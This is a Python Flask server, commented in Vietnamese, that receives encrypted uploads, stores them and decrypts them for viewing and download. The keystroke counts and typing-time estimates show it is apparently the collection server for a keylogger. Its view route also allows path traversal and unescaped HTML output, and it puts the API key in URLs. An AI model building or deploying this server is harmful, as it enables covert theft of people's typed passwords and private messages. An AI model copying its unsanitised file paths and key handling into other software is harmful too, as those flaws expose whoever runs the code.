from flask import Flask, request, render_template, send_from_directory
from cryptography.fernet import Fernet
import os
import logging
from datetime import datetime

app = Flask(__name__)


LOG_FOLDER = "logs"
API_KEY = "YOUR_SECRET_KEY"  # Thay bằng API key bí mật
ALLOWED_EXTENSIONS = {'enc'}
# ===========================================

os.makedirs(LOG_FOLDER, exist_ok=True)

logging.basicConfig(
    filename='server.log',
    level=logging.INFO,
    format='[%(asctime)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# Load key giải mã
with open("server_key.key", "rb") as f:
    DECRYPT_KEY = f.read()
fernet = Fernet(DECRYPT_KEY)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def parse_log_stats(decrypted_text):
    num_chars = len(decrypted_text)
    lines = decrypted_text.split('\n')
    timestamps = [line for line in lines if line.strip()]
    duration_minutes = round(len(timestamps) * 0.2, 2)  # Giả sử mỗi dòng là 12s gõ
    return num_chars, duration_minutes

@app.route('/')
def home():
    files = os.listdir(LOG_FOLDER)
    log_infos = []

    for filename in sorted(files, reverse=True):
        filepath = os.path.join(LOG_FOLDER, filename)
        try:
            with open(filepath, 'rb') as f:
                decrypted = fernet.decrypt(f.read()).decode()
            num_keys, duration = parse_log_stats(decrypted)
        except Exception as e:
            num_keys, duration = 0, 0
            logging.warning(f"Failed to parse {filename}: {e}")

        log_infos.append({
            "filename": filename,
            "num_keys": num_keys,
            "duration": duration
        })

    return render_template('index.html', files=log_infos, api_key=API_KEY)

@app.route('/upload', methods=['POST'])
def handle_upload():
    if request.headers.get('X-API-Key') != API_KEY:
        logging.warning("Unauthorized upload attempt!")
        return "Forbidden", 403

    if 'file' not in request.files:
        return "No file", 400

    file = request.files['file']
    if not allowed_file(file.filename):
        return "Invalid file type", 400

    filename = f"{datetime.now().strftime('%Y%m%d-%H%M%S')}.enc"
    file.save(os.path.join(LOG_FOLDER, filename))

    logging.info(f"File received: {filename}")
    return "Upload success", 200

@app.route('/view/<filename>')
def view_file(filename):
    api_key = request.args.get('key')
    if api_key != API_KEY:
        return "Forbidden", 403

    filepath = os.path.join(LOG_FOLDER, filename)
    if not os.path.exists(filepath):
        return "File not found", 404

    try:
        with open(filepath, 'rb') as f:
            decrypted = fernet.decrypt(f.read()).decode()
        return f"<pre>{decrypted}</pre>"
    except Exception as e:
        return f"Decryption failed: {str(e)}", 500

@app.route('/download/<filename>')
def download_file(filename):
    api_key = request.args.get('key')
    if api_key != API_KEY:
        return "Forbidden", 403

    filepath = os.path.join(LOG_FOLDER, filename)
    if not os.path.exists(filepath):
        return "File not found", 404

    return send_from_directory(LOG_FOLDER, filename, as_attachment=True)

if __name__ == '__main__':
    print("🟢 SERVER IS RUNNING: http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
